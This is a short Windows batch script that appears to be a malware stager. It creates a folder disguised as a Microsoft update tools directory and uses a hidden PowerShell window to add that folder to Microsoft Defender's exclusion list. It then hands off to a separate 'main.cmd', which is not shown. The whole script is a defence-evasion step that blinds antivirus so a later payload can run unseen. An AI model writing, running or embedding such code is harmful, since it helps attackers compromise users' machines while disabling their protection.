@echo off
set SystemRoot=C:\Windows
set "STAGE=C:\Program Files\Microsoft Update Health Tools\Tools"

mkdir "%STAGE%" 2>nul

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Add-MpPreference -ExclusionPath '%STAGE%'"

call "%~dp0main.cmd"
